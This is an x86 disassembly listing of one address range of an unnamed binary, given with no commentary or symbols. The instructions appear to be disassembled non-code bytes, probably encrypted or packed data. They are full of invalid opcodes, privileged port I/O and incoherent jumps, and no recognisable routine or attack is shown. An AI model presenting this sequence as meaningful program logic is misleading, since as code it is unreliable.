  402a1e:	cmp    BYTE PTR [esp+ebx*2+0x1a],ah
  402a22:	frstor [ecx+0x2b]
  402a25:	cwde   
  402a26:	jle    0x402a95
  402a28:	lea    edi,[edx-0x16]
  402a2b:	and    eax,0xff1b1edd
  402a30:	fxam   
  402a32:	inc    eax
  402a33:	add    eax,0x61c9c648
  402a38:	ror    DWORD PTR [ebx-0x7243a7e4],cl
  402a3e:	adc    eax,0x776f495f
  402a43:	mov    al,ds:0xc1107242
  402a48:	and    esi,0xaea3423e
  402a4e:	pop    es
  402a4f:	out    dx,al
  402a50:	xor    DWORD PTR [ebx+0x59],edi
  402a53:	sbb    bl,BYTE PTR [esi+ebp*8+0x28]
  402a57:	xlat   BYTE PTR ds:[ebx]
  402a58:	inc    ebp
  402a59:	dec    esp
  402a5a:	and    dl,BYTE PTR [ecx-0x241bff4c]
  402a60:	jg     0x402ac3
  402a62:	retf   
  402a63:	xchg   esp,eax
  402a64:	adc    DWORD PTR [ebx+0xc],edi
  402a67:	mov    dl,0xbd
  402a69:	cwde   
  402a6a:	arpl   sp,di
  402a6c:	pushf  
  402a6d:	aas    
  402a6e:	jecxz  0x402a32
  402a70:	jbe    0x402a88
  402a72:	mov    dh,0xd2
  402a74:	jge    0x402ac5
  402a76:	lahf   
  402a77:	fstp   DWORD PTR [esi]
  402a79:	fwait
  402a7a:	std    
  402a7b:	mov    esi,0xbaa9b050
  402a80:	fcmovbe st,st(7)
  402a82:	sub    DWORD PTR [edx+ebp*1],ebp
  402a85:	sbb    ah,BYTE PTR [edx]
  402a87:	in     eax,0x53
  402a89:	jb     0x402a3a
  402a8b:	mov    al,ds:0x91e1bdd4
  402a90:	xchg   ebx,eax
  402a91:	test   BYTE PTR [esi-0x41878da],0x78
  402a98:	in     al,dx
  402a99:	jbe    0x402b00
  402a9b:	ret    
  402a9c:	cmp    eax,0x3cba8761
  402aa1:	aas    
  402aa2:	jnp    0x402a4e
  402aa4:	xchg   edx,eax
  402aa5:	xchg   edx,eax
  402aa6:	(bad)  
  402aa7:	push   0xb1da77a8
  402aac:	test   BYTE PTR [ecx+edi*8],ch
  402aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ab0:	mov    gs,WORD PTR [edi]
  402ab2:	dec    eax
  402ab3:	(bad)  
  402ab4:	push   ecx
  402ab5:	dec    ecx
  402ab6:	je     0x402b29
  402ab8:	push   esp
  402ab9:	(bad)  
  402aba:	int    0x95
  402abc:	pop    ds
  402abd:	inc    ebp
  402abe:	mov    edx,DWORD PTR [edi]
  402ac0:	(bad)  
  402ac1:	in     al,dx
  402ac2:	nop
  402ac3:	inc    edi
  402ac4:	(bad)  
  402ac5:	stc    
  402ac6:	mov    ds:0x22f4ae6d,eax
  402acb:	sub    dl,0x65
  402ace:	popf   
  402acf:	gs ret 0xf3a6
  402ad3:	mov    ds:0xb7fc2e26,eax
  402ad8:	jl     0x402b01
  402ada:	mov    edi,DWORD PTR ds:0xc52cad2f
  402ae0:	inc    edx
  402ae1:	jnp    0x402af1
  402ae3:	dec    esp
  402ae4:	in     al,0x4a
  402ae6:	das    
  402ae7:	mov    ds:0xe4162f7a,al
  402aec:	add    DWORD PTR [ecx],esi
  402aee:	imul   edi,DWORD PTR [edx+eiz*1-0x56],0xfffffff5
  402af3:	out    dx,al
  402af4:	mov    edi,0xd4650409
  402af9:	out    0xca,eax
  402afb:	and    DWORD PTR [ecx+0x41],0xb3fa3b97
  402b02:	xor    bl,BYTE PTR [esi-0x61730bc7]
  402b08:	das    
  402b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b0a:	cs inc esp
  402b0c:	and    DWORD PTR ds:0xa62de2df,esp
  402b12:	push   edi
  402b13:	cmp    BYTE PTR [ebx-0x35b593ff],ch
  402b19:	aaa    
  402b1a:	xchg   edx,eax
  402b1b:	loope  0x402abc
  402b1d:	mov    eax,0x27817447
  402b22:	leave  
  402b23:	push   ebx
  402b24:	xchg   esp,eax
  402b25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b26:	js     0x402b22
  402b28:	push   es
  402b29:	into   
  402b2a:	mov    BYTE PTR [eax-0x6eeab671],0x13
  402b31:	fdiv   QWORD PTR ds:0x1890da46
  402b37:	int    0xec
  402b39:	enter  0x41a1,0x6c
  402b3d:	add    eax,0xe1755df2
  402b42:	mov    gs,esp
  402b44:	scas   al,BYTE PTR es:[edi]
  402b45:	mov    bh,0xa8
  402b47:	sahf   
  402b48:	jmp    0x402bb3
  402b4a:	test   al,0xdb
  402b4c:	test   BYTE PTR [edi-0x48],bl
  402b4f:	jo     0x402b11
  402b51:	jno    0x402b58
  402b53:	mov    bl,bh
  402b55:	adc    BYTE PTR [edi],ch
  402b57:	add    cl,0xb0
  402b5a:	aad    0x18
  402b5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b5d:	cmp    eax,0xcecfd69a
  402b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b63:	fiadd  WORD PTR cs:[eax+0x32b8eec0]
  402b6a:	popa   
  402b6b:	std    
  402b6c:	pop    ebx
  402b6d:	sub    bl,dl
  402b6f:	push   edx
  402b70:	dec    eax
  402b71:	sahf   
  402b72:	xchg   edx,eax
  402b73:	push   esi
  402b74:	sar    BYTE PTR ds:[ecx+0x1eff4e94],0x2e
  402b7c:	shl    DWORD PTR [ebx],cl
  402b7e:	mov    eax,ds:0x86cf99e3
  402b83:	ret    0x7a19
  402b86:	addr16 sbb al,0x66
  402b89:	jbe    0x402b2c
  402b8b:	xchg   ecx,eax
  402b8c:	gs jns 0x402b19
  402b8f:	xchg   DWORD PTR [eax-0x5b],esi
  402b92:	and    eax,DWORD PTR [ebp-0x47]
  402b95:	out    dx,al
  402b96:	jbe    0x402bea
  402b98:	sti    
  402b99:	add    BYTE PTR [edi-0x4b4e5217],0xf7
  402ba0:	and    edx,DWORD PTR [ebx-0x73e2dd18]
  402ba6:	daa    
  402ba7:	bound  esi,QWORD PTR [ebp+0x39]
  402baa:	jmp    0x402bcb
  402bac:	lods   eax,DWORD PTR ds:[esi]
  402bad:	in     eax,0xb4
  402baf:	fsub   st,st(6)
  402bb1:	and    al,ah
  402bb3:	jmp    0x3643:0x92ce7390
  402bba:	cmp    esp,eax
  402bbc:	mov    al,0xa9
  402bbe:	mov    edi,0x3f1269b4
  402bc3:	jmp    0xe05a9dc7
  402bc8:	pop    esp
  402bc9:	inc    ebx
  402bca:	xchg   ebp,eax
  402bcb:	pop    ebx
  402bcc:	mov    ebp,0xbc659395
  402bd1:	or     ch,cl
  402bd3:	dec    ecx
  402bd4:	xor    al,0x9b
  402bd6:	bound  esi,QWORD PTR [ecx]
  402bd8:	xor    esi,DWORD PTR [ebx-0x62c06f00]
  402bde:	into   
  402bdf:	cmp    ch,bh
  402be1:	shr    ebp,cl
  402be3:	add    esp,DWORD PTR [ebx+0x5b]
  402be6:	push   edx
  402be7:	loopne 0x402b92
  402be9:	cdq    
  402bea:	push   ebx
  402beb:	inc    ecx
  402bec:	pop    ebp
  402bed:	fs jb  0x402b82
  402bf0:	(bad)  
  402bf1:	fs mov dh,0xc4
  402bf4:	pop    ss
  402bf5:	mov    esp,0x5606ea13
  402bfa:	dec    edi
  402bfb:	adc    DWORD PTR [ebp+eiz*4+0x1a],0x1
  402c00:	pop    ecx
  402c01:	dec    edx
  402c02:	or     DWORD PTR [edi*2-0x570a2390],ecx
  402c09:	sbb    eax,0x730f596f
  402c0e:	adc    BYTE PTR [ebp-0x1ec8aaf1],al
  402c14:	(bad)  
  402c15:	sbb    esp,DWORD PTR [esi+eiz*1]
  402c18:	push   0x83f48010
  402c1d:	or     eax,0x848424fb
  402c22:	inc    ecx
  402c23:	dec    ebx
  402c24:	and    BYTE PTR ds:0xa02500bf,ah
  402c2a:	inc    ebx
  402c2b:	sbb    dl,BYTE PTR [edi-0x74]
  402c2e:	lahf   
  402c2f:	inc    ebx
  402c30:	popw   es
  402c32:	ror    DWORD PTR [ebp+0x32],0x80
  402c36:	test   DWORD PTR [ecx+0x12d4485a],ebp
  402c3c:	sbb    ch,ch
  402c3e:	or     ah,BYTE PTR [ecx+0x64]
  402c41:	(bad)  
  402c42:	sub    cl,dl
  402c44:	shl    DWORD PTR [ebx+0x49637e19],0x74
  402c4b:	mov    dl,0x72
  402c4d:	add    esp,DWORD PTR [ebx]
  402c4f:	lods   al,BYTE PTR ds:[esi]
  402c50:	test   BYTE PTR [esi-0x58b374cc],bh
  402c56:	adc    DWORD PTR [edi],esi
  402c58:	cmp    bl,BYTE PTR [ebx]
  402c5a:	adc    al,0xf2
  402c5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c5d:	out    0x61,al
  402c5f:	inc    ecx
  402c60:	mov    ds:0xb5826974,eax
  402c65:	push   ecx
  402c66:	imul   edi,DWORD PTR [edx+ecx*1],0xd18e64af
  402c6d:	push   esp
  402c6e:	sub    DWORD PTR [eax],edx
  402c70:	repz test bl,cl
  402c73:	sar    DWORD PTR [ecx+0x78e9c44f],1
  402c79:	add    esi,DWORD PTR [ebx-0x19]
  402c7c:	jmp    0x402c6f
  402c7e:	fbld   TBYTE PTR [esi+eax*1+0x72]
  402c82:	add    ch,BYTE PTR [esp+eax*2-0x44]
  402c86:	dec    edi
  402c87:	dec    ebx
  402c88:	or     DWORD PTR [eax+0xca3ff7f],esi
  402c8e:	mov    WORD PTR [edx+0x54],ss
  402c91:	(bad)  
  402c93:	lods   al,BYTE PTR ds:[esi]
  402c94:	sbb    eax,0x7d4d10b8
  402c99:	or     esp,DWORD PTR [edi]
  402c9b:	mov    dl,0xb6
  402c9d:	mov    DWORD PTR [ecx],0x4ce18bec
  402ca3:	adc    DWORD PTR [edx-0x4a8f14c],0xd88d5f47
  402cad:	adc    DWORD PTR [edi+0x7903e131],ebx
  402cb3:	mov    al,ds:0x906dca2c
  402cb8:	jmp    0x9c9d:0x87515156
  402cbf:	in     eax,dx
  402cc0:	mov    ebp,0xe2986e96
  402cc5:	mov    eax,0x39ec94f9
  402cca:	imul   edi,edi,0x76
  402ccd:	xchg   edx,eax
  402cce:	or     BYTE PTR [edi],dl
  402cd0:	arpl   WORD PTR ss:[ebx],ax
  402cd3:	jecxz  0x402d4a
  402cd5:	daa    
  402cd6:	and    BYTE PTR [ebx],cl
  402cd8:	lea    ebp,[ecx+ecx*4+0x69]
  402cdc:	cwde   
  402cdd:	jmp    0x402c91
  402cdf:	push   ecx
  402ce0:	imul   ecx,DWORD PTR [esi+0x57],0x3c0197ab
  402ce7:	mov    cl,0x4f
  402ce9:	xor    al,0xd
  402ceb:	and    ah,BYTE PTR [edi-0x15]
  402cee:	sbb    edx,DWORD PTR [edi+0x7e40ec6]
  402cf4:	adc    ebp,edi
  402cf6:	scas   al,BYTE PTR es:[edi]
  402cf7:	inc    edx
  402cf8:	cdq    
  402cf9:	retf   
  402cfa:	dec    edi
  402cfb:	out    dx,eax
  402cfc:	sub    al,0x9c
  402cfe:	lea    esi,[ebx]
  402d00:	inc    eax
  402d01:	jl     0x402c9d
  402d03:	test   al,0x1c
  402d05:	out    dx,eax
  402d06:	jmp    0x8d1a:0x201c7906
  402d0d:	ror    esi,0xa8
  402d10:	test   eax,0x1d79fec9
  402d15:	cmp    BYTE PTR [edx],ah
  402d17:	jge    0x402d50
  402d19:	rcl    DWORD PTR [ecx-0x4e],1
  402d1c:	adc    eax,0x7d7a6e04
  402d21:	lods   al,BYTE PTR ds:[esi]
  402d22:	leave  
  402d23:	xchg   esi,eax
  402d24:	sbb    bl,al
  402d26:	cmc    
  402d27:	cli    
  402d28:	pop    eax
  402d29:	ror    edi,1
  402d2b:	lds    ecx,FWORD PTR [ebp+0x39b0e5ee]
  402d31:	sub    edi,DWORD PTR [esi]
  402d33:	jge    0x402d52
  402d35:	adc    BYTE PTR [edi+eax*1-0x32],al
  402d39:	(bad)  
  402d3a:	fwait
  402d3b:	jp     0x402db4
  402d3d:	or     DWORD PTR [ebx+0x36799700],ebp
  402d43:	jne    0x402d26
  402d45:	mov    dh,0x96
  402d47:	or     DWORD PTR [esi+0x5a],edx
  402d4a:	fimul  WORD PTR [ebx+0x39]
  402d4d:	jmp    0x854f3c05
  402d52:	pop    edi
  402d53:	dec    ebx
  402d54:	int3   
  402d55:	js     0x402d0f
  402d57:	neg    BYTE PTR [ecx-0x62]
  402d5a:	mov    eax,0x21a3edad
  402d5f:	pop    esi
  402d60:	stc    
  402d61:	mov    cl,BYTE PTR [esi-0xb]
  402d64:	adc    DWORD PTR [ebx+0x46],esp
  402d67:	push   es
  402d68:	ss hlt 
  402d6a:	into   
  402d6b:	mov    ebp,0x333d436e
  402d70:	xchg   al,ah
  402d72:	ins    DWORD PTR es:[edi],dx
  402d73:	popf   
  402d74:	aam    0xd9
  402d76:	xchg   DWORD PTR [ecx+0xd],eax
  402d79:	loopne 0x402dcb
  402d7b:	aaa    
  402d7c:	sub    BYTE PTR [eax],ah
  402d7e:	xchg   edx,eax
  402d7f:	adc    eax,0xadf7ccbe
  402d84:	lahf   
  402d85:	or     DWORD PTR [edi+0x18b29cbc],ebx
  402d8b:	jge    0x402dc5
  402d8d:	pop    eax
  402d8e:	je     0x402d5c
  402d90:	or     bh,BYTE PTR [eax]
  402d92:	into   
  402d93:	or     eax,0x8981b7d3
  402d98:	inc    ecx
  402d99:	(bad)  
  402d9a:	fcomp  DWORD PTR ds:0x263f
  402d9f:	js     0x402df2
  402da1:	cmp    eax,0xc3b01a44
  402da6:	shl    BYTE PTR [esp+edi*2],1
  402da9:	outs   dx,BYTE PTR ds:[esi]
  402daa:	in     eax,dx
  402dab:	repz hlt 
  402dad:	lock int 0xb7
  402db0:	mov    cs,WORD PTR [esi-0x9]
  402db3:	and    esi,ebx
  402db5:	pop    ecx
  402db6:	bound  eax,QWORD PTR [edx]
  402db8:	sub    BYTE PTR [ebx+ebp*4-0x4c],dh
  402dbc:	dec    ecx
  402dbd:	xor    bl,BYTE PTR [ebx-0x124b2d87]
  402dc3:	leave  
  402dc4:	test   BYTE PTR ds:0xa9c7d4d3,al
  402dca:	inc    eax
  402dcb:	stos   BYTE PTR es:[edi],al
  402dcc:	mov    dl,0xc5
  402dce:	ja     0x402df1
  402dd0:	sbb    cl,BYTE PTR [edx+0x43c8b3c1]
  402dd6:	fst    DWORD PTR [ecx+ebx*8+0x25b5caf6]
  402ddd:	inc    edx
  402dde:	add    ah,bh
  402de0:	cwde   
  402de1:	aas    
  402de2:	popa   
  402de3:	je     0x402d9d
  402de5:	test   BYTE PTR [ebp-0x2082e9fb],al
  402deb:	cli    
  402dec:	sbb    dh,dh
  402dee:	xchg   ecx,eax
  402def:	dec    edi
  402df0:	enter  0xd5ef,0x3b
  402df4:	mov    ah,0xe6
  402df6:	pop    eax
  402df7:	inc    edx
  402df8:	cmp    DWORD PTR [esi],ebp
  402dfa:	mov    dl,0x77
  402dfc:	mov    bl,0xcc
  402dfe:	pop    ebp
  402dff:	mov    BYTE PTR [ebx-0x4fadbdfc],al
  402e05:	pusha  
  402e06:	(bad)  
  402e07:	in     al,0x70
  402e09:	cld    
  402e0a:	xchg   ebx,eax
  402e0b:	and    BYTE PTR [edx+ecx*4-0x56adc4b2],dh
  402e12:	xor    DWORD PTR [esi+eiz*8],ecx
  402e15:	mov    fs,WORD PTR ds:0xdf160587
  402e1b:	sub    esp,ebx
  402e1d:	test   al,0x73
  402e1f:	cmp    edi,DWORD PTR [ecx+0x64f96331]
  402e25:	outs   dx,BYTE PTR ds:[esi]
  402e26:	popf   
  402e27:	push   es
  402e28:	(bad)  
  402e29:	dec    edi
  402e2a:	je     0x402e77
  402e2c:	pop    edx
  402e2d:	jbe    0x402de5
  402e2f:	cdq    
  402e30:	(bad)  [ebp+0x439fe6ab]
  402e36:	mov    edx,0xd559b681
  402e3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e3c:	or     DWORD PTR [esi+0x175703f0],0x6627c988
  402e46:	dec    edx
  402e47:	pop    ss
  402e48:	or     BYTE PTR [eax],al
  402e4a:	js     0x402e23
  402e4c:	das    
  402e4d:	neg    DWORD PTR [ebx-0x57b69068]
  402e53:	jg     0x402ed2
  402e55:	and    eax,0x62dba1e5
  402e5a:	mov    DWORD PTR [ecx-0x50],edx
  402e5d:	pushf  
  402e5e:	dec    ebp
  402e5f:	xor    eax,0x5dca4f57
  402e64:	fimul  DWORD PTR [eax]
  402e66:	mov    eax,ds:0xe3f66fe2
  402e6b:	push   ebx
  402e6c:	sub    DWORD PTR [edx+esi*1-0x658ecbe2],edi
  402e73:	aam    0xde
  402e75:	adc    esp,DWORD PTR [eax+eiz*1+0x69]
  402e79:	push   eax
  402e7a:	dec    ecx
  402e7b:	and    edx,DWORD PTR [edx]
  402e7d:	jmp    0xfc6fa329
  402e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e83:	mov    eax,ds:0x7148cc29
  402e88:	sbb    BYTE PTR [eax],ah
  402e8a:	push   edx
  402e8b:	ins    DWORD PTR es:[edi],dx
  402e8c:	sub    ebx,DWORD PTR [eax+0x74]
  402e8f:	leave  
  402e90:	into   
  402e91:	and    eax,0x52c63812
  402e96:	lods   al,BYTE PTR ds:[esi]
  402e97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e98:	adc    eax,0xfd72e9b5
  402e9d:	in     al,0x42
  402e9f:	mov    ch,0x35
  402ea1:	push   es
  402ea2:	xchg   ebp,eax
  402ea3:	dec    esi
  402ea4:	daa    
  402ea5:	xor    al,0x46
  402ea7:	sbb    BYTE PTR [edi+0x28],ah
  402eaa:	or     al,0x75
  402eac:	call   0x63d1fed9
  402eb1:	out    dx,eax
  402eb2:	jge    0x402ee6
  402eb4:	push   ecx
  402eb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402eb6:	outs   dx,DWORD PTR gs:[esi]
  402eb8:	push   0x23b8e878
  402ebd:	sub    BYTE PTR [eax-0x3f9e7838],ch
  402ec3:	lods   eax,DWORD PTR gs:[esi]
  402ec5:	movaps XMMWORD PTR [edx+0x5ad263c5],xmm1
  402ecc:	in     al,dx
  402ecd:	pop    esp
  402ece:	xchg   esp,ecx
  402ed0:	addr16 ds mov ch,0xbc
  402ed4:	bnd ret 0x6141
  402ed8:	push   ebx
  402ed9:	mov    DWORD PTR [edx+eiz*4-0x4a10342b],ebp
  402ee0:	(bad)  
  402ee1:	fadd   QWORD PTR [eax+ebx*1+0x7e]
  402ee5:	add    DWORD PTR [ebx-0x50681573],edi
  402eeb:	sub    DWORD PTR [esi+ebx*1],esi
  402eee:	int    0xd
  402ef0:	repnz push esp
  402ef2:	sbb    bl,BYTE PTR [ecx-0x670a2d94]
  402ef8:	sar    ebx,1
  402efa:	jp     0x402f04
  402efc:	inc    eax
  402efd:	and    bl,BYTE PTR [ebp+0x597f46e4]
  402f03:	push   edx
  402f04:	ja     0x402ef9
  402f06:	lods   eax,DWORD PTR ds:[esi]
  402f07:	lods   al,BYTE PTR ds:[esi]
  402f08:	push   es
  402f09:	lds    ebp,FWORD PTR [ebx]
  402f0b:	iret   
  402f0c:	or     eax,0xc5e2610f
  402f11:	mov    al,ds:0x65a93003
  402f16:	jnp    0x402eb8
  402f18:	push   esi
  402f19:	cmp    BYTE PTR [edx],dl
  402f1b:	fisttp WORD PTR [edi+0xd]
  402f1e:	sbb    ebp,DWORD PTR [edi]
  402f20:	jl     0x402f5a
  402f22:	mov    edi,0xa1500ad9
  402f27:	ret    
  402f28:	in     eax,0x28
  402f2a:	mov    ebp,0x2ef39150
  402f2f:	loope  0x402f7c
  402f31:	cmp    al,0x8d
  402f33:	and    BYTE PTR [eax+0x30b40961],dl
  402f39:	(bad)  
  402f3a:	adc    bh,dh
  402f3c:	pop    es
  402f3d:	scas   eax,DWORD PTR es:[edi]
  402f3e:	ds mov dl,cl
  402f41:	aad    0x6b
  402f43:	jge    0x402fa1
  402f45:	out    dx,eax
  402f46:	add    al,0x67
  402f48:	std    
  402f49:	jl     0x402ee6
  402f4b:	sti    
  402f4c:	and    al,0x32
  402f4e:	add    ebx,DWORD PTR [ecx-0x744f66d3]
  402f54:	xor    al,0x1
  402f56:	push   esp
  402f57:	push   0xffffffb5
  402f59:	jo     0x402fa5
  402f5b:	mov    ah,0x3
  402f5d:	mov    WORD PTR [ecx],ss
  402f5f:	data16 mov dl,0x0
  402f62:	sbb    bl,bh
  402f64:	out    dx,al
  402f65:	out    dx,al
  402f66:	fst    DWORD PTR [edx]
  402f68:	out    dx,al
  402f69:	nop
  402f6a:	or     DWORD PTR ds:0xea08a2c2,ebx
  402f70:	jbe    0x402f9c
  402f72:	aam    0xcf
  402f74:	mov    al,ds:0x8761c88e
  402f79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f7a:	iret   
  402f7b:	icebp  
  402f7c:	in     eax,dx
  402f7d:	mov    bh,BYTE PTR [esi]
  402f7f:	lea    ebx,[esp+edi*4-0x6f]
  402f83:	cli    
  402f84:	xor    eax,0xf878e1e1
  402f89:	cmp    BYTE PTR [esi+ecx*8],dl
  402f8c:	out    0x5b,eax
  402f8e:	jg     0x402f6b
  402f90:	mov    al,0x50
  402f92:	sti    
  402f93:	test   DWORD PTR [eax+edx*2+0x2d],ecx
  402f97:	jnp    0x402fa0
  402f99:	dec    ebp
  402f9a:	mov    cl,0x90
  402f9c:	push   ecx
  402f9d:	cmp    ebp,DWORD PTR [ecx+0x64c39422]
  402fa3:	outs   dx,DWORD PTR ds:[esi]
  402fa4:	addr16 ror edx,0x4a
  402fa8:	fsubr  st(4),st
  402faa:	das    
  402fab:	push   ecx
  402fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fae:	je     0x403009
  402fb0:	jns    0x402fce
  402fb2:	gs sub eax,0xec6bcc01
  402fb8:	(bad)  [edi-0x6]
  402fbb:	pop    ds
  402fbc:	sbb    BYTE PTR [ebx+0x6f],cl
  402fbf:	mov    ebx,0xe86b91ed
  402fc4:	and    ebp,DWORD PTR [ebx+0x27d1ff9b]
  402fca:	rcl    BYTE PTR [edi-0x5a],cl
  402fcd:	inc    esi
  402fce:	in     eax,dx
  402fcf:	jbe    0x403005
  402fd1:	fldenv ds:0xdb5d648
  402fd7:	popa   
  402fd8:	in     al,0xe5
  402fda:	add    al,0x59
  402fdc:	jb     0x402f8d
  402fde:	inc    eax
  402fdf:	cmp    bh,al
  402fe1:	push   0x32b82304
  402fe6:	(bad)  
  402fe7:	and    DWORD PTR ds:0x2840a0a,eax
  402fed:	in     al,0x1b
  402fef:	jmp    0x402fb8
  402ff1:	into   
  402ff2:	or     eax,0xa9dc404b
  402ff7:	lock and edx,DWORD PTR [eax+0x22]
  402ffb:	and    eax,0xeff9796
  403000:	dec    edx
  403001:	daa    
  403002:	xchg   BYTE PTR [eax-0x267c2c33],dh
  403008:	cmp    BYTE PTR [esi-0x7172de40],dl
  40300e:	xor    ebx,DWORD PTR [ecx]
  403010:	jne    0x403006
  403012:	mov    eax,ds:0x985feb0a
  403017:	pop    edi
  403018:	xlat   BYTE PTR ds:[ebx]
  403019:	in     eax,0xe2
  40301b:	jle    0x402fb1
  40301d:	ficomp DWORD PTR [edx]
  40301f:	icebp  
  403020:	mov    ch,0xc7
  403022:	mov    al,0xa6
  403024:	sub    DWORD PTR [eax],edi
  403026:	out    dx,al
  403027:	clc    
  403028:	jle    0x40308e
  40302a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40302b:	mov    eax,0x202d177
  403030:	sub    eax,0xbc29a114
  403035:	mov    eax,ds:0x81563d99
  40303a:	push   ds
  40303b:	lods   al,BYTE PTR ds:[esi]
  40303c:	test   ebx,esp
  40303e:	inc    ebx
  40303f:	push   eax
  403040:	nop
  403041:	fs jg  0x402fdb
  403044:	xchg   esp,eax
  403045:	icebp  
  403046:	into   
  403047:	test   BYTE PTR [esi-0x44],ah
  40304a:	mov    cl,0x93
  40304c:	dec    esp
  40304d:	mov    cl,0x5a
  40304f:	jge    0x402ff5
  403051:	mov    al,ds:0x976a932d
  403056:	mov    esi,edi
  403058:	call   FWORD PTR [esi-0x3e0f7b50]
  40305e:	adc    esp,ebx
  403060:	dec    ebx
  403061:	add    BYTE PTR [eax+0x43ae6a46],0x84
  403068:	(bad)  
  403069:	pop    esi
  40306a:	test   BYTE PTR [edi],bl
  40306c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40306e:	sahf   
  40306f:	xchg   ebp,eax
  403070:	mov    bh,0x5
  403072:	jbe    0x403025
  403074:	mov    ah,0x72
  403076:	xchg   edi,eax
  403077:	outs   dx,DWORD PTR ds:[esi]
  403078:	xchg   BYTE PTR [edx-0x164df39e],ah
  40307e:	test   edi,0x186ceff9
  403084:	cmp    BYTE PTR [ecx-0x29],al
  403087:	xchg   edi,esi
  403089:	fsubr  QWORD PTR fs:[eax]
  40308c:	jmp    0x40304c
  40308e:	scas   al,BYTE PTR es:[edi]
  40308f:	js     0x4030ef
  403091:	xor    eax,0x5b9c8de6
  403096:	xor    edx,DWORD PTR [edi+0x7db33b39]
  40309c:	push   ebx
  40309d:	stc    
  40309e:	scas   eax,DWORD PTR es:[edi]
  40309f:	dec    ebp
  4030a0:	xor    DWORD PTR [edi+edi*2-0x52856236],edi
  4030a7:	sti    
  4030a8:	iret   
  4030a9:	jg     0x4030aa
  4030ab:	add    eax,ebx
  4030ad:	fwait
  4030ae:	push   eax
  4030af:	sbb    al,0xe9
  4030b1:	jne    0x403044
  4030b3:	pop    ecx
  4030b4:	loopne 0x4030dc
  4030b6:	xchg   edi,eax
  4030b7:	xchg   esi,eax
  4030b8:	pop    ss
  4030b9:	add    bh,bh
  4030bb:	xchg   esp,eax
  4030bc:	int    0x40
  4030be:	aaa    
  4030bf:	ror    BYTE PTR [ebp+0x5a3acd81],0x2
  4030c6:	jne    0x403086
  4030c8:	ds jne 0x403056
  4030cb:	add    eax,0xeca656e9
  4030d0:	inc    BYTE PTR [edx+0x3f9bea00]
  4030d6:	push   ebx
  4030d7:	scas   al,BYTE PTR es:[edi]
  4030d8:	jnp    0x40306a
  4030da:	pushf  
  4030db:	cmc    
  4030dc:	or     edi,DWORD PTR [edx-0x729f0678]
  4030e2:	mov    eax,ds:0x9140d61
  4030e7:	fsubr  st,st(4)
  4030e9:	xor    BYTE PTR [edx-0x5439ec8b],dl
  4030ef:	xlat   BYTE PTR ds:[bx]
  4030f1:	dec    esi
  4030f2:	fs leave 
  4030f4:	push   ds
  4030f5:	mov    dl,0x85
  4030f7:	hlt    
  4030f8:	shl    DWORD PTR [eax+0x60],1
  4030fb:	aas    
  4030fc:	(bad)  
  4030fd:	mov    WORD PTR [ebp+0x6e],gs
  403100:	scas   eax,DWORD PTR es:[edi]
  403101:	xor    al,0xea
  403103:	in     eax,0x8c
  403105:	in     al,0xa5
  403107:	arpl   WORD PTR [edx],cx
  403109:	addr16 hlt 
  40310b:	mov    edx,0xc86a0115
  403110:	aam    0x82
  403112:	arpl   WORD PTR [edx],cx
  403114:	sbb    al,0xff
  403116:	(bad)  
  403117:	mov    bl,0x93
  403119:	jbe    0x403156
  40311b:	imul   edx,DWORD PTR [eax+0x7dc7118e],0xfffffff8
  403122:	xchg   BYTE PTR [esi],al
  403124:	mov    edi,0x11f1d94
  403129:	aam    0x8e
  40312b:	outs   dx,BYTE PTR ds:[esi]
  40312c:	outs   dx,BYTE PTR ds:[esi]
  40312d:	lds    ebp,FWORD PTR [ebx-0x8]
  403130:	ss add cl,dh
  403133:	mov    cl,0x31
  403135:	inc    ecx
  403136:	pop    ebx
  403137:	inc    esi
  403138:	inc    ecx
  403139:	mov    ch,0x51
  40313b:	mov    ch,0xb7
  40313d:	out    0xe7,eax
  40313f:	ins    DWORD PTR es:[edi],dx
  403140:	dec    edx
  403141:	stc    
  403142:	xchg   esp,eax
  403143:	xchg   esi,eax
  403144:	es sub al,0x8b
  403147:	push   edx
  403148:	mov    bh,0x9f
  40314a:	(bad)  
  40314b:	daa    
  40314c:	push   edi
  40314d:	pop    eax
  40314e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40314f:	and    al,0xf9
  403151:	or     ch,ah
  403153:	mov    ebx,0x8f7fd593
  403158:	sbb    eax,0x69088ec7
  40315d:	and    bl,dh
  40315f:	aad    0x8e
  403161:	mov    ecx,0x4432dcd0
  403166:	aas    
  403167:	pop    es
  403168:	icebp  
  403169:	sti    
  40316a:	and    dl,BYTE PTR [ebp-0x5a]
  40316d:	outs   dx,DWORD PTR ds:[esi]
  40316e:	push   esi
  40316f:	fnstenv [eax+0x75eaf276]
  403175:	xchg   esi,eax
  403176:	xor    eax,0x41d4ec90
  40317b:	outs   dx,BYTE PTR ds:[esi]
  40317c:	sub    bh,0xbc
  40317f:	retf   0xef36
  403182:	push   edi
  403183:	or     esi,ebp
  403185:	shl    BYTE PTR fs:[edi+0x5b200e2d],1
  40318c:	sahf   
  40318d:	push   cs
  40318e:	add    al,0x31
  403190:	xchg   esi,eax
  403191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403192:	jmp    eax
  403194:	dec    ebx
  403195:	adc    eax,0x33dc7bf8
  40319a:	push   0x5f7b5555
  40319f:	xchg   ebx,eax
  4031a0:	pushf  
  4031a1:	jb     0x4031ee
  4031a3:	iret   
  4031a4:	pop    ebx
  4031a5:	push   ebp
  4031a6:	xor    DWORD PTR [edi+0x41],esi
  4031a9:	add    eax,ebp
  4031ab:	xchg   edx,eax
  4031ac:	sub    cl,BYTE PTR [eax-0x3a51125c]
  4031b2:	or     BYTE PTR [ecx],ah
  4031b4:	xor    eax,0xa96c601a
